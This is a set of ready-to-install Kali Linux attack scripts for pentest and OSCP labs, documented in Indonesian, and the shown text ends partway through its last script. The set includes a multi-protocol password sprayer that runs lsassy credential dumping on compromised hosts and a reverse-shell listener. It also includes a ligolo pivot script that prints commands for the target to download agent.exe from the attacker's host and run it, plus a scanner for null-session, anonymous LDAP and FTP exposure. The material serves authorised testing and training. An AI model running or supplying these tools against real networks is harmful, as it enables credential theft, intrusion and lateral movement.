# ⚙️ Custom Commands (Kali Linux)

Kumpulan shortcut untuk mempercepat workflow pentest / OSCP.

---

## 1. webserver

**Deskripsi:** HTTP server + auto generate wget & PowerShell (IWR)

### Setup
```bash
sudo nano /usr/local/bin/webserver
sudo chmod +x /usr/local/bin/webserver
```

### Script
```bash
#!/bin/bash

PORT=${1:-8000}

echo "[+] Starting web server on port $PORT..."
echo

FILES=$(ls -p | grep -v /)

echo "[+] Available download commands:"
echo

ip -4 -o addr show | awk '!/ lo / {
    split($4,a,"/");
    print $2 " (" a[1] "):"
}' | while read line; do

    IFACE=$(echo $line | awk '{print $1}')
    IP=$(echo $line | awk -F'[()]' '{print $2}')

    echo "$IFACE:"
    
    for f in $FILES; do
        echo "  wget http://$IP:$PORT/$f"
        echo "  iwr -uri http://$IP:$PORT/$f -Outfile $f"
    done

    echo
done

echo "[+] Serving files from: $(pwd)"
echo "----------------------------------------"

python3 -m http.server "$PORT" --bind 0.0.0.0
```

### Usage
```bash
webserver 80
```

---

## 2. rdp

**Deskripsi:** Shortcut cepat untuk koneksi RDP (xfreerdp)

### Setup
```bash
sudo nano /usr/local/bin/rdp
sudo chmod +x /usr/local/bin/rdp
```

### Script
```bash
#!/bin/bash

IP=$1
USER=${2:-Administrator}
PASS=$3

if [ -z "$IP" ]; then
    echo "Usage: rdp <ip> [user] [pass]"
    exit 1
fi

if [ -z "$PASS" ]; then
    read -s -p "Password: " PASS
    echo
fi

xfreerdp /v:$IP /u:$USER /p:"$PASS" /dynamic-resolution /cert:ignore +clipboard /timeout:5000 || echo "[!] Connection failed"
```

### Usage
```bash
rdp 192.168.50.250
rdp 192.168.50.250 offsec lab
```

### Info
- Default user: `Administrator`
- Password hidden saat input
- Clipboard aktif
- Cert: ignore (lab friendly)

---

## 3. spray

**Deskripsi:** Shortcut cepat untuk spray user password ke list target (net exec / nxc)

### Setup
```bash
sudo nano /usr/local/bin/spray
sudo chmod +x /usr/local/bin/spray
```

### Script
```bash
#!/bin/bash

# ===============================
# spray v5 - Domain + Local Auth Support
# ===============================

TARGET_FILE=${1:-target}
USER_FILE=${2:-user}
PASS_FILE=${3:-pass}
AUTH_MODE=${4:-domain}   # domain | local

OUTDIR="spray_netexec"
RAW_OUT="$OUTDIR/raw_spray.txt"
CLEAN_OUT="$OUTDIR/clean_spray.txt"
SMB_OUT="$OUTDIR/smb_spray.txt"

THREADS=1
PROTOCOLS=("smb" "rdp" "wmi" "winrm" "mssql" "ssh" "ftp" "vnc" "nfs" "ldap")

# ===============================
# HELP
# ===============================
if [[ "$1" == "-h" || "$1" == "--help" ]]; then
    echo "spray v5 - Domain & Local auth supported"
    echo
    echo "Usage:"
    echo "  spray [target] [user] [pass] [mode]"
    echo
    echo "Mode:"
    echo "  domain (default)"
    echo "  local"
    exit 0
fi

# ===============================
# DEP CHECK
# ===============================
command -v nxc >/dev/null || { echo "[!] nxc not found"; exit 1; }

# ===============================
# FILE CHECK
# ===============================
for f in "$TARGET_FILE" "$USER_FILE" "$PASS_FILE"; do
    [ -f "$f" ] || { echo "[!] Missing file: $f"; exit 1; }
done

# ===============================
# AUTH MODE
# ===============================
if [[ "$AUTH_MODE" == "local" ]]; then
    AUTH_FLAG="--local-auth"
else
    AUTH_FLAG=""
fi

# ===============================
# INIT OUTPUT
# ===============================
mkdir -p "$OUTDIR"
> "$RAW_OUT"
> "$CLEAN_OUT"
> "$SMB_OUT"

TARGETS=$(tr '\n' ' ' < "$TARGET_FILE")

echo "[+] Mode    : $AUTH_MODE"
echo "[+] Targets : $TARGET_FILE"
echo "[+] Users   : $USER_FILE"
echo "[+] Password: $PASS_FILE"
echo

# ===============================
# SPRAY LOOP
# ===============================
for proto in "${PROTOCOLS[@]}"; do
    echo "========================================"
    echo "[+] Trying protocol: $proto"
    echo "========================================"

    TMP_OUT=$(mktemp)

    nxc $proto $TARGETS \
        -u "$USER_FILE" \
        -p "$PASS_FILE" \
        $AUTH_FLAG \
        --threads $THREADS \
        --continue-on-success \
        --no-progress 2>/dev/null | tee "$TMP_OUT"

    cat "$TMP_OUT" >> "$RAW_OUT"
    grep -i "\[+\]" "$TMP_OUT" >> "$CLEAN_OUT"

    # Lockout protection
    if grep -q "STATUS_ACCOUNT_LOCKED_OUT" "$TMP_OUT"; then
        echo "[!] Lockout detected! Stopping..."
        rm -f "$TMP_OUT"
        exit 1
    fi

    # ===============================
    # SMB ENUM
    # ===============================
    if [[ "$proto" == "smb" ]]; then
        echo "[+] Checking valid SMB creds..."

        grep -i "\[+\]" "$TMP_OUT" | while read -r line; do

        IP=$(echo "$line" | awk '{print $2}')
        CREDS=$(echo "$line" | grep -oP '(?<=\[\+\] ).*')

        USER_PART=$(echo "$CREDS" | awk -F':' '{print $1}')
        PASS=$(echo "$CREDS" | awk -F':' '{print $2}')

        if [[ "$USER_PART" == *\\* ]]; then
            DOMAIN=$(echo "$USER_PART" | awk -F'\\' '{print $1}')
            USER=$(echo "$USER_PART" | awk -F'\\' '{print $2}')
        else
            DOMAIN=""
            USER="$USER_PART"
        fi

        if [[ -z "$USER" || -z "$PASS" ]]; then
            echo "[!] Parse failed: $line"
            continue
        fi

        echo "[+] SMB ENUM: $IP | $USER:$PASS"

        if [[ "$AUTH_MODE" == "local" ]]; then
            OUT=$(nxc smb "$IP" -u "$USER" -p "$PASS" --local-auth --shares --threads 1 --no-progress 2>/dev/null)
        elif [[ -n "$DOMAIN" ]]; then
            OUT=$(nxc smb "$IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --shares --threads 1 --no-progress 2>/dev/null)
        else
            OUT=$(nxc smb "$IP" -u "$USER" -p "$PASS" --shares --threads 1 --no-progress 2>/dev/null)
        fi
        
        echo "$OUT" | tee -a "$SMB_OUT"
        
        # cek apakah login sukses
        if echo "$OUT" | grep -q "Pwn3d!"; then
            echo "[+] SMB compromised, running lsassy..." | tee -a "$SMB_OUT"
        
            if [[ "$AUTH_MODE" == "local" ]]; then
                nxc smb "$IP" -u "$USER" -p "$PASS" --local-auth -M lsassy --no-progress 2>/dev/null | tee -a "$SMB_OUT"
            elif [[ -n "$DOMAIN" ]]; then
                nxc smb "$IP" -u "$USER" -p "$PASS" -d "$DOMAIN" -M lsassy --no-progress 2>/dev/null | tee -a "$SMB_OUT"
            else
                nxc smb "$IP" -u "$USER" -p "$PASS" -M lsassy --no-progress 2>/dev/null | tee -a "$SMB_OUT"
            fi
        fi

        done
    fi

    rm -f "$TMP_OUT"
    echo
done

echo "[+] Done!"
echo "[+] Raw   : $RAW_OUT"
echo "[+] Clean : $CLEAN_OUT"
echo "[+] SMB   : $SMB_OUT"
```

### Usage
```bash
spray
spray listip user.txt pass.txt
```

### Info
- Default if running without parameter spray = spray target user pass

---

## 4. webdav

**Deskripsi:** Shortcut cepat untuk running webdav (wsgidav)

### Setup
```bash
sudo nano /usr/local/bin/webdav
sudo chmod +x /usr/local/bin/webdav
```

### Script
```bash
#!/bin/bash

# Default values
DIR="/tmp/wsgidav"
PORT="80"

# Help menu
if [[ "$1" == "-h" || "$1" == "--help" ]]; then
    echo "Usage: webdav [directory] [port]"
    echo ""
    echo "Examples:"
    echo "  webdav                     # default /tmp/wsgidav port 80"
    echo "  webdav /tmp/share          # custom directory"
    echo "  webdav /tmp/share 8080     # custom directory + port"
    exit 0
fi

# Arguments
[[ -n "$1" ]] && DIR="$1"
[[ -n "$2" ]] && PORT="$2"

# Create directory if not exists
if [[ ! -d "$DIR" ]]; then
    echo "[+] Creating directory: $DIR"
    mkdir -p "$DIR"
fi

# Get IP
IP=$(hostname -I | awk '{print $1}')

# Banner
echo "[+] WebDAV Server Starting"
echo "[+] Root : $DIR"
echo "[+] Port : $PORT"
echo "[+] URL  : http://$IP:$PORT/"
echo ""

# Run WebDAV
wsgidav --host=0.0.0.0 --port="$PORT" --root="$DIR" --auth=anonymous


```

### Usage
```bash
webdav (Default /tmp/webdav port 80)
webdav /home/kali/share 8080 (Custom folder + port)
```

---


## 5. Reverse shell

**Deskripsi:** Shortcut cepat untuk running nc -lnvp + session log + rlwrap

### Setup
```bash
sudo nano /usr/local/bin/revshell
sudo chmod +x /usr/local/bin/revshell
```

### Script
```bash
#!/bin/bash

PORT=${1:-4444}
LOG="session_${PORT}_$(date +%F_%H-%M-%S).log"

echo "[+] Reverse shell listener"
echo "[+] Port : $PORT"
echo "[+] Log  : $LOG"
echo ""

script -f "$LOG" -c "rlwrap nc -lnvp $PORT"
```

### Usage
```bash
rev (default port 4444)
rev 1234
rev 8000
rev 9001
```

---

## 6. Ligolo-auto

**Deskripsi:** Shortcut cepat untuk running ligolo + create tun interface untuk pivoting + running webserver di folder yang telah ditentukan.

### Setup
```bash
sudo nano /usr/local/bin/ligolo-auto
sudo chmod +x /usr/local/bin/ligolo-auto
```

### Script
```bash
#!/bin/bash

LIGOLO_DIR="/opt/postexploitation/ligolo"
PORT=11601
WEBPORT=8000
IFACE="ligolo"

# =========================
# DETECT IP
# =========================
IP=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
[ -z "$IP" ] && IP=$(hostname -I | awk '{print $1}')

echo "[+] Attacker IP : $IP"
echo ""

# =========================
# SETUP TUN (AUTO)
# =========================
echo "[+] Preparing TUN interface..."

if ip link show $IFACE >/dev/null 2>&1; then
    echo "[*] TUN already exists, reusing..."
else
    sudo ip tuntap add user $(whoami) mode tun $IFACE
    sudo ip link set $IFACE up
    echo "[+] TUN created: $IFACE"
fi

echo ""

# =========================
# START WEBSERVER
# =========================
if [ -f "$LIGOLO_DIR/agent.exe" ]; then
    echo "[+] Starting webserver on :$WEBPORT"
    (cd "$LIGOLO_DIR" && python3 -m http.server $WEBPORT >/dev/null 2>&1 &)
else
    echo "[!] agent.exe not found!"
fi

# =========================
# TARGET COMMAND
# =========================
CMD1="iwr http://$IP:$WEBPORT/agent.exe -OutFile agent.exe"
CMD2="Start-Process .\\agent.exe -ArgumentList '-connect $IP:$PORT -ignore-cert'"

echo "[+] Run on target:"
echo "--------------------------------"
echo "$CMD1"
echo "$CMD2"
echo "--------------------------------"

# =========================
# START PROXY
# =========================
echo ""
echo "[*] Starting Ligolo..."
cd "$LIGOLO_DIR" || exit
./proxy -selfcert
                 
```

### Usage
```bash
ligolo-auto
```

## 7. Ligolo-route

**Deskripsi:** Shortcut cepat untuk nambah routing untuk pivoting menggunakan ligolo.

### Setup
```bash
sudo nano /usr/local/bin/ligolo-route
sudo chmod +x /usr/local/bin/ligolo-route
```

### Script
```bash
#!/bin/bash

IFACE="ligolo"

if [ -z "$1" ]; then
    echo "Usage: ligolo-route <subnet>"
    exit 1
fi

echo "[+] Adding route $1 via $IFACE"
sudo ip route add $1 dev $IFACE
                 
```

### Usage
```bash
ligolo-route 172.16.6.0/24
```

## 8. spray_noauth

**Deskripsi:** Shortcut cepat untuk spray enumerasi awal (net exec / nxc) tanpa user dan password (coba scan port semua protokol yang disupport nxc: smb, ssh, ldap, ftp, wmi, winrm, rdp, vnc, mssql, nfs)

### Setup
```bash
sudo nano /usr/local/bin/spray_noauth
sudo chmod +x /usr/local/bin/spray_noauth
```

### Script
```bash
#!/bin/bash

# ====================================================
# NoAuth / Guest / Anonymous Exposure Scanner
# Upgrade:
# - DC detection via LDAP + Kerberos
# - Dynamic domain discovery
# - Kerbrute userenum per detected DC with timeout
# - Merge LDAP users + Kerbrute users
# - ASREP exposure audit via LDAP UAC flag, no hash dumping/cracking
# - Binary-safe LDAP parsing
# - Robust kerbrute path detection
# ====================================================

# --- COLORS ---
BLUE='\033[0;34m'
CYAN='\033[0;36m'
GREEN='\033[0;32m'
PURPLE='\033[0;35m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

# --- ARGUMENTS ---
TARGET_FILE=${1:-target}
DOMAIN_NAME=${2:-auto}
USERLIST=${3:-/usr/share/seclists/Usernames/kerbrute-userstatisticallynonseclists.txt}

KERBRUTE_TIMEOUT=${KERBRUTE_TIMEOUT:-60}
LDAP_TIMEOUT=${LDAP_TIMEOUT:-8}

# Optional env override:
# KERBRUTE_BIN=/usr/local/bin/kerbrute ./script.sh target
KERBRUTE_BIN=${KERBRUTE_BIN:-}

# --- OUTPUT FILES ---
OUTDIR="spray_netexec"
SCAN_FILE="$OUTDIR/nmap_scan.gnmap"
RAW_OUT="$OUTDIR/raw_spray_noauth.txt"
FINAL_OUT="$OUTDIR/final_noauth_summary.txt"
KERBRUTE_STATUS_FILE="$OUTDIR/info_kerbrute_status.txt"
MERGED_USERS_STATUS_FILE="$OUTDIR/info_merged_ldap_kerbrute_users_status.txt"
ASREP_AUDIT_STATUS_FILE="$OUTDIR/info_asrep_audit_status.txt"

if [[ ! -f "$TARGET_FILE" ]]; then
    echo -e "${YELLOW}[!] Error: File '$TARGET_FILE' tidak ditemukan.${NC}"
    echo -e "${BLUE}[i] Usage:${NC}"
    echo -e "    $0 <target_file> [domain|auto] [userlist]"
    echo
    echo -e "${BLUE}[i] Examples:${NC}"
    echo -e "    $0 target"
    echo -e "    $0 target auto /usr/share/seclists/Usernames/kerbrute-userstatisticallynonseclists.txt"
    echo -e "    $0 target corp.com /usr/share/seclists/Usernames/kerbrute-userstatisticallynonseclists.txt"
    echo
    echo -e "${BLUE}[i] Optional:${NC}"
    echo -e "    KERBRUTE_TIMEOUT=300 $0 target"
    echo -e "    KERBRUTE_BIN=/usr/local/bin/kerbrute $0 target"
    exit 1
fi

mkdir -p "$OUTDIR"
: > "$RAW_OUT"
: > "$KERBRUTE_STATUS_FILE"
: > "$MERGED_USERS_STATUS_FILE"
: > "$ASREP_AUDIT_STATUS_FILE"

# ====================================================
# HELPER FUNCTIONS
# ====================================================

get_ips_by_port() {
    grep -a " $1/open/" "$SCAN_FILE" 2>/dev/null | awk '{print $2}' | sort -u
}

dn_to_fqdn() {
    echo "$1" | sed -E 's/DC=//g; s/,/./g; s/[[:space:]]//g'
}

fqdn_to_basedn() {
    echo "$1" | awk -F'.' '{
        for (i=1; i<=NF; i++) {
            printf "DC=%s", $i
            if (i<NF) printf ","
        }
        printf "\n"
    }'
}

safe_name() {
    echo "$1" | tr '/: ' '___'
}

clean_nxc_file() {
    local file="$1"
    [[ ! -f "$file" ]] && return 0
    LC_ALL=C perl -i -pe 's/\x00//g; s/\r//g' "$file"
}

normalize_user_only_stream() {
    # stdin -> lowercase username only, strip domain and CR, remove blanks
    tr '[:upper:]' '[:lower:]' | \
        sed 's/\r$//' | \
        sed 's/@.*$//' | \
        sed 's/\\.*$//' | \
        awk 'NF'
}

find_kerbrute() {
    if [[ -n "$KERBRUTE_BIN" ]]; then
        if [[ -x "$KERBRUTE_BIN" ]]; then
            echo "$KERBRUTE_BIN"
            return 0
        fi

        if command -v "$KERBRUTE_BIN" >/dev/null 2>&1; then
            command -v "$KERBRUTE_BIN"
            return 0
        fi
    fi

    if command -v kerbrute >/dev/null 2>&1; then
        command -v kerbrute
        return 0
    fi

    for kb in \
        /usr/local/bin/kerbrute \
        /usr/bin/kerbrute \
        /root/go/bin/kerbrute \
        /opt/kerbrute/kerbrute \
        /opt/kerbrute_linux_arm64 \
        /opt/kerbrute_linux_amd64
    do
        if [[ -x "$kb" ]]; then
            echo "$kb"
            return 0
        fi
    done

    return 1
}

get_domain_for_dc() {
    local ip="$1"
    local domain=""
    local base_dn=""

    if [[ -n "$DOMAIN_NAME" && "$DOMAIN_NAME" != "auto" && "$DOMAIN_NAME" != "." ]]; then
        echo "$DOMAIN_NAME"
        return 0
    fi

    if command -v ldapsearch >/dev/null 2>&1; then
        base_dn=$(timeout "${LDAP_TIMEOUT}s" ldapsearch -x -LLL -H "ldap://$ip" -s base defaultNamingContext 2>/dev/null | \
                  awk -F': ' '/^defaultNamingContext:/{print $2; exit}')

        if [[ -z "$base_dn" ]]; then
            base_dn=$(timeout "${LDAP_TIMEOUT}s" ldapsearch -x -LLL -H "ldap://$ip" -s base namingContexts 2>/dev/null | \
                      awk -F': ' '/^namingContexts: DC=/{print $2; exit}')
        fi

        if [[ -n "$base_dn" ]]; then
            domain=$(dn_to_fqdn "$base_dn")
        fi
    fi

    if [[ -z "$domain" ]] && command -v nxc >/dev/null 2>&1; then
        domain=$(timeout 10s nxc ldap "$ip" -u '' -p '' --no-progress 2>/dev/null | \
                 grep -aoiE 'domain:[[:space:]]*[A-Za-z0-9._-]+' | \
                 head -n1 | awk -F':' '{print $2}' | xargs)

        if [[ -z "$domain" ]]; then
            domain=$(timeout 10s nxc smb "$ip" -u '' -p '' --no-progress 2>/dev/null | \
                     grep -aoiE 'domain:[[:space:]]*[A-Za-z0-9._-]+' | \
                     head -n1 | awk -F':' '{print $2}' | xargs)
        fi

        if [[ -z "$domain" ]]; then
            domain=$(timeout 10s nxc ldap "$ip" -u '' -p '' --no-progress 2>/dev/null | \
                     grep -aoE '\[\+\][[:space:]]+[A-Za-z0-9._-]+\\:' | \
                     head -n1 | sed -E 's/^\[\+\][[:space:]]+//; s/\\:$//' | xargs)
        fi
    fi

    echo "$domain"
}

get_basedn_for_dc() {
    local ip="$1"
    local domain="$2"
    local base_dn=""

    if command -v ldapsearch >/dev/null 2>&1; then
        base_dn=$(timeout "${LDAP_TIMEOUT}s" ldapsearch -x -LLL -H "ldap://$ip" -s base defaultNamingContext 2>/dev/null | \
                  awk -F': ' '/^defaultNamingContext:/{print $2; exit}')
    fi

    if [[ -z "$base_dn" && -n "$domain" ]]; then
        base_dn=$(fqdn_to_basedn "$domain")
    fi

    echo "$base_dn"
}

# ====================================================
# PRE-FLIGHT
# ====================================================

echo -e "${PURPLE}====================================================${NC}"
echo -e "${GREEN}[+] PRE-FLIGHT CHECK${NC}"
echo -e "${PURPLE}====================================================${NC}"

if ! command -v nmap >/dev/null 2>&1; then
    echo -e "${RED}[!] nmap not found. Install dulu.${NC}"
    exit 1
fi

if ! command -v nxc >/dev/null 2>&1; then
    echo -e "${RED}[!] nxc/netexec not found. Install dulu.${NC}"
    exit 1
fi

RESOLVED_KERBRUTE="$(find_kerbrute || true)"

if [[ -n "$RESOLVED_KERBRUTE" ]]; then
    echo -e "${GREEN}[+] kerbrute found:${NC} $RESOLVED_KERBRUTE"
else
    echo -e "${YELLOW}[!] kerbrute belum ditemukan. Phase kerbrute akan di-skip.${NC}"
fi

echo -e "${BLUE}[i] Kerbrute timeout:${NC} ${KERBRUTE_TIMEOUT}s"

if [[ ! -f "$USERLIST" ]]; then
    echo -e "${YELLOW}[!] Userlist tidak ditemukan: $USERLIST${NC}"
    echo -e "${YELLOW}[!] Phase kerbrute akan skip kecuali userlist valid diberikan.${NC}"
else
    echo -e "${GREEN}[+] Userlist found:${NC} $USERLIST"
    echo -e "${BLUE}[i] Userlist lines:${NC} $(wc -l < "$USERLIST")"
fi

# ====================================================
# PHASE 1: PORT SCANNING
# ====================================================

echo -e "\n${PURPLE}====================================================${NC}"
echo -e "${GREEN}[+] PHASE 1: MASSIVE EFFICIENT PORT SCANNING${NC}"
echo -e "${PURPLE}====================================================${NC}"

ALL_PORTS="21,22,88,135,389,445,1433,2049,3389,5900,5985"

echo -e "${CYAN}[*] Scanning $ALL_PORTS on all targets...${NC}"

nmap -Pn -n -iL "$TARGET_FILE" \
    -p "$ALL_PORTS" \
    --version-intensity 0 \
    -sV \
    --host-timeout 30s \
    --open \
    -oG "$SCAN_FILE" > /dev/null

echo -e "${GREEN}[+] Scan selesai. Memetakan target aktif per protokol...${NC}"

echo -e "${BLUE}----------------------------------------------------${NC}"

for p in 445 3389 135 5985 1433 22 21 5900 2049 389 88; do
    case $p in
        445) proto="smb";;
        3389) proto="rdp";;
        135) proto="wmi";;
        5985) proto="winrm";;
        1433) proto="mssql";;
        22) proto="ssh";;
        21) proto="ftp";;
        5900) proto="vnc";;
        2049) proto="nfs";;
        389) proto="ldap";;
        88) proto="kerberos";;
    esac

    get_ips_by_port "$p" > "$OUTDIR/active_$proto.txt"
    COUNT=$(wc -l < "$OUTDIR/active_$proto.txt")
    [[ $COUNT -gt 0 ]] && echo -e "${CYAN}[*] $proto:${NC} $COUNT hosts found"
done

echo -e "${BLUE}----------------------------------------------------${NC}"

# ====================================================
# PHASE 2: NOAUTH / GUEST CHECK
# ====================================================

echo -e "\n${PURPLE}====================================================${NC}"
echo -e "${GREEN}[+] PHASE 2: DEEP ANONYMOUS/GUEST CHECK${NC}"
echo -e "${PURPLE}====================================================${NC}"

# ---------------- SMB Testing ----------------

if [[ -s "$OUTDIR/active_smb.txt" ]]; then
    echo -e "${YELLOW}[*] SMB: Running Null Session check...${NC}"
    timeout 40s nxc smb "$OUTDIR/active_smb.txt" \
        -u '' -p '' \
        --shares \
        --no-progress 2>&1 | tee -a "$RAW_OUT"

    echo -e "${YELLOW}[*] SMB: Running Guest Local Auth check...${NC}"
    timeout 40s nxc smb "$OUTDIR/active_smb.txt" \
        -u 'guest' -p '' \
        --local-auth \
        --shares \
        --no-progress 2>&1 | tee -a "$RAW_OUT"

    echo -e "${YELLOW}[*] SMB: Running Guest Domain Auth check. Domain: $DOMAIN_NAME${NC}"
    timeout 40s nxc smb "$OUTDIR/active_smb.txt" \
        -u 'guest' -p '' \
        -d "$DOMAIN_NAME" \
        --shares \
        --no-progress 2>&1 | tee -a "$RAW_OUT"
fi

# ---------------- FTP Testing + Auto-LS ----------------

if [[ -s "$OUTDIR/active_ftp.txt" ]]; then
    echo -e "${YELLOW}[*] FTP: Checking Anonymous Login & Listing Files...${NC}"

    while IFS= read -r ip; do
        [[ -z "$ip" ]] && continue

        echo -e "\n${CYAN}>>> Testing FTP Anonymous: $ip${NC}"

        nxc ftp "$ip" \
            -u 'anonymous' -p '' \
            --ls \
            --no-progress 2>&1 | tee .tmp_ftp | tee -a "$RAW_OUT"

        clean_nxc_file .tmp_ftp

        if grep -aq "\[+\]" .tmp_ftp; then
            echo -e "${GREEN}[!] SUCCESS: Anonymous FTP on $ip!${NC}"

            FTP_LOG="$OUTDIR/ftp_files_$ip.txt"
            cp .tmp_ftp "$FTP_LOG"
            clean_nxc_file "$FTP_LOG"

            echo -e "${BLUE}[i] File list saved to $FTP_LOG${NC}"

            if grep -aiE "pass|pwd|conf|secret|user|backup|key" "$FTP_LOG"; then
                echo -e "${RED}[!!!] ALERT: Interesting files found on FTP $ip!${NC}"
                grep -aiE "pass|pwd|conf|secret|user|backup|key" "$FTP_LOG"
            fi
        fi
    done < "$OUTDIR/active_ftp.txt"

    rm -f .tmp_ftp
fi

# ---------------- LDAP Testing + Null Bind Enumeration ----------------

if [[ -s "$OUTDIR/active_ldap.txt" ]]; then
    echo -e "${YELLOW}[*] LDAP: Checking Null Bind & Enumerating via NXC...${NC}"

    while IFS= read -r ip; do
        [[ -z "$ip" ]] && continue

        echo -e "\n${CYAN}>>> Testing LDAP Null Bind: $ip${NC}"

        nxc ldap "$ip" \
            -u '' -p '' \
            --no-progress 2>&1 | tee .tmp_ldap | tee -a "$RAW_OUT"

        clean_nxc_file .tmp_ldap

        if grep -aq "\[+\]" .tmp_ldap; then
            echo -e "${GREEN}[!] SUCCESS: Null Bind found on $ip!${NC}"

            LDAP_DUMP_DIR="$OUTDIR/ldap_nxc_$ip"
            mkdir -p "$LDAP_DUMP_DIR"
            SUMMARY_FILE="$LDAP_DUMP_DIR/summary.txt"

            echo -e "${PURPLE}[EXEC] Collecting Raw Data...${NC}"

            nxc ldap "$ip" -u '' -p '' --users > "$LDAP_DUMP_DIR/users.txt" 2>&1
            nxc ldap "$ip" -u '' -p '' --groups > "$LDAP_DUMP_DIR/groups.txt" 2>&1
            nxc ldap "$ip" -u '' -p '' --trusted-for-delegation > "$LDAP_DUMP_DIR/delegation.txt" 2>&1
            nxc ldap "$ip" -u '' -p '' --pass-pol > "$LDAP_DUMP_DIR/password_policy.txt" 2>&1

            clean_nxc_file "$LDAP_DUMP_DIR/users.txt"
            clean_nxc_file "$LDAP_DUMP_DIR/groups.txt"
            clean_nxc_file "$LDAP_DUMP_DIR/delegation.txt"
            clean_nxc_file "$LDAP_DUMP_DIR/password_policy.txt"

            echo -e "${PURPLE}[SUMMARY] CREATING ENUMERATION SUMMARY...${NC}"
            echo -e "==== AD ENUMERATION SUMMARY ($ip) ====" > "$SUMMARY_FILE"

            # A. Groups
            echo -e "${PURPLE}[SUMMARY] Extracting Groups...${NC}"
            echo "GroupName;Description;MemberCount" >> "$SUMMARY_FILE"

            TMP_GLIST="$OUTDIR/.tmp_glist_$ip"
            : > "$TMP_GLIST"

            grep -a "LDAP" "$LDAP_DUMP_DIR/groups.txt" | grep -avE "\[\*\]|\[\+\]|\-Group\-" | while read -r line; do
                clean_line=$(echo "$line" | perl -pe 's/^LDAP\s+\d+\.\d+\.\d+\.\d+\s+\d+\s+\S+\s+//')
                count=$(echo "$clean_line" | perl -nE 'say $1 if /\s+(\d+)\s+/')

                if [[ -n "$count" && "$count" -gt 0 ]]; then
                    name=$(echo "$clean_line" | perl -pe "s/\s+$count\s+.*$//" | xargs)
                    desc=$(echo "$clean_line" | perl -pe "s/^.*?$count\s+//" | xargs)

                    if [[ -n "$name" ]]; then
                        echo "$name;$desc;$count" >> "$SUMMARY_FILE"
                        echo "$name" >> "$TMP_GLIST"
                    fi
                fi
            done

            # B. Unconstrained Delegation
            echo -e "\n[Users with Unconstrained Delegation]" >> "$SUMMARY_FILE"

            grep -a "LDAP" "$LDAP_DUMP_DIR/delegation.txt" | grep -avE "\[\*\]|\[\+\]|signing:|channel binding:" | while read -r line; do
                user_del=$(echo "$line" | sed -E 's/^.*[0-9]{3}\s+\S+\s+//' | xargs)
                [[ -n "$user_del" && ! "$user_del" == *\$ ]] && echo "$user_del" >> "$SUMMARY_FILE"
            done

            # C. Group Membership Mapping
            echo -e "${PURPLE}[MAPPING] Checking Group Members...${NC}"
            echo -e "\n[Group Membership Mapping]" >> "$SUMMARY_FILE"
            echo "GroupName;Members" >> "$SUMMARY_FILE"

            if [[ -f "$TMP_GLIST" ]]; then
                while IFS= read -r gname; do
                    [[ -z "$gname" ]] && continue

                    m_list=$(nxc ldap "$ip" \
                        -u '' -p '' \
                        --groups "$gname" \
                        --no-progress 2>/dev/null | \
                        perl -pe 's/\x00//g; s/\r//g' | \
                        grep -a "LDAP" | \
                        grep -avE "\[\*\]|\[\+\]|Members of this group|Description" | \
                        awk '{print $5}' | \
                        xargs | sed 's/ /, /g')

                    m_list=$(echo "$m_list" | sed 's/\[-\]//g' | xargs)

                    if [[ -n "$m_list" && "$m_list" != "members" ]]; then
                        echo "$gname;$m_list" >> "$SUMMARY_FILE"
                    fi
                done < "$TMP_GLIST"

                rm -f "$TMP_GLIST"
            fi

            # D. User Details
            echo -e "\n[User Details]" >> "$SUMMARY_FILE"
            echo "Username;LastPWSet;BadPW;Description" >> "$SUMMARY_FILE"

            grep -a "LDAP" "$LDAP_DUMP_DIR/users.txt" | grep -avE "\[\*\]|\[\+\]|\-Username\-" | while read -r line; do
                u_content=$(echo "$line" | sed -E 's/^.*[0-9]{3}\s+\S+\s+//')
                u_name=$(echo "$u_content" | awk '{print $1}')
                [[ -z "$u_name" ]] && continue

                if echo "$u_content" | grep -aq "<never>"; then
                    u_pw="never"
                    u_bad=$(echo "$u_content" | awk '{print $3}')
                    u_desc=$(echo "$u_content" | cut -d ' ' -f 4- | xargs)
                else
                    u_pw=$(echo "$u_content" | awk '{print $2" "$3}')
                    u_bad=$(echo "$u_content" | awk '{print $4}')
                    u_desc=$(echo "$u_content" | cut -d ' ' -f 5- | xargs)
                fi

                echo "$u_name;$u_pw;$u_bad;$u_desc" >> "$SUMMARY_FILE"
            done

            # E. Quick LDAP Userlist username-only
            LDAP_USERS_ONLY="$LDAP_DUMP_DIR/users_only_$ip.txt"

            grep -a "LDAP" "$LDAP_DUMP_DIR/users.txt" | \
                grep -vE "\[\*\]|\[\+\]|\[\-\]|Error|operationsError" | \
                awk '{print $NF}' | \
                sed 's/.*\\//' | \
                normalize_user_only_stream | \
                grep -vE '^\s*$|^\[.*\]$' | \
                sort -u > "$LDAP_USERS_ONLY"


            echo -e "${GREEN}[+] Summary and Mapping completed: $SUMMARY_FILE${NC}"
            echo -e "${GREEN}[+] LDAP users saved to: $LDAP_USERS_ONLY${NC}"

        else
            echo -e "${RED}[-] Null Bind failed on $ip.${NC}"
        fi

        rm -f .tmp_ldap
    done < "$OUTDIR/active_ldap.txt"
fi

# ---------------- NFS Testing ----------------

if [[ -s "$OUTDIR/active_nfs.txt" ]]; then
    echo -e "${YELLOW}[*] NFS: Listing exports...${NC}"
    nxc nfs "$OUTDIR/active_nfs.txt" \
        --no-progress 2>&1 | tee -a "$RAW_OUT"
fi

# ====================================================
# PHASE 2.5: DC DETECTION + KERBRUTE USERENUM
# ====================================================

echo -e "\n${PURPLE}====================================================${NC}"
echo -e "${GREEN}[+] PHASE 2.5: DOMAIN CONTROLLER DETECTION + KERBRUTE${NC}"
echo -e "${PURPLE}====================================================${NC}"

DC_CANDIDATES="$OUTDIR/dc_candidates.txt"
DC_INFO="$OUTDIR/dc_domain_mapping.txt"

: > "$DC_CANDIDATES"
: > "$DC_INFO"

if [[ -s "$OUTDIR/active_ldap.txt" && -s "$OUTDIR/active_kerberos.txt" ]]; then
    comm -12 "$OUTDIR/active_ldap.txt" "$OUTDIR/active_kerberos.txt" > "$DC_CANDIDATES"
fi

RESOLVED_KERBRUTE="$(find_kerbrute || true)"

if [[ -n "$RESOLVED_KERBRUTE" ]]; then
    echo -e "${GREEN}[+] Kerbrute binary:${NC} $RESOLVED_KERBRUTE"
else
    echo -e "${YELLOW}[!] kerbrute not found. Userenum will be skipped.${NC}"
fi

if [[ -s "$DC_CANDIDATES" ]]; then
    echo -e "${CYAN}[*] Possible Domain Controllers found:${NC}"
    cat "$DC_CANDIDATES"

